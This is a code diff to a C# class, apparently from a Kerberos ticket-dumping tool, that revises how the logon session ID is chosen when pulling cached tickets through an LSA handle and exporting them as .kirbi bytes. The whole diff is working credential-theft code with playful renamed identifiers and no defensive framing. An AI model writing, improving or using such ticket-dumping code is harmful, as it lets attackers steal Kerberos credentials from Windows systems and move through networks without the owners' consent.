@@ -87,16 +87,38 @@ internal sealed class MinistryLedger
         {
             var packageId = LookupKerbPackage(lsaHandle, out packageBuffer);
 
-            // Untrusted handle can only query the current session.
-            var queryLuid = trusted ? requestedLuid : default;
-            if (!trusted && (requestedLuid.LowPart != 0 || requestedLuid.HighPart != 0))
+            // Untrusted handle must query with LUID {0,0} (current session).
+            // Determine whether the requested LUID belongs to the current session.
+            Luid outputLuid;
+            if (trusted)
             {
-                Console.Error.WriteLine(
-                    "[!] Insufficient privilege to retrieve tickets for another session; " +
-                    "dumping the current session instead.");
+                outputLuid = requestedLuid;
+            }
+            else
+            {
+                var currentLuid = GetCurrentLuid();
+                var isCurrent = requestedLuid.LowPart == 0 && requestedLuid.HighPart == 0
+                    || (currentLuid.LowPart == requestedLuid.LowPart
+                        && currentLuid.HighPart == requestedLuid.HighPart);
+
+                if (!isCurrent)
+                {
+                    Console.Error.WriteLine(
+                        "[!] Insufficient privilege to retrieve tickets for another session; " +
+                        "dumping the current session instead.");
+                }
+
+                // Use the requested LUID for display if it matches, otherwise the actual current one.
+                outputLuid = isCurrent ? requestedLuid : currentLuid;
             }
 
-            var scrolls = QueryTicketsForSession(lsaHandle, packageId, queryLuid, serviceFilter);
+            // Trusted path queries with the actual LUID; untrusted must use {0,0}.
+            var callLuid = trusted ? outputLuid : default;
+
+            var scrolls = QueryTicketsForSession(lsaHandle, packageId, callLuid, serviceFilter)
+                .Select(s => s with { LuidLow = outputLuid.LowPart, LuidHigh = outputLuid.HighPart })
+                .ToList()
+                .AsReadOnly();
 
             var kirbis = new List<KirbiRecord>(scrolls.Count);
             foreach (var scroll in scrolls)
@@ -108,7 +130,7 @@ internal sealed class MinistryLedger
                         : $"{scroll.ServiceName}@{scroll.ServiceRealm}";
 
                     var kirbiBytes = RetrieveSingleEncodedTicket(
-                        lsaHandle, packageId, queryLuid, targetName);
+                        lsaHandle, packageId, callLuid, targetName);
 
                     kirbis.Add(new KirbiRecord(
                         scroll.LuidLow, scroll.LuidHigh,
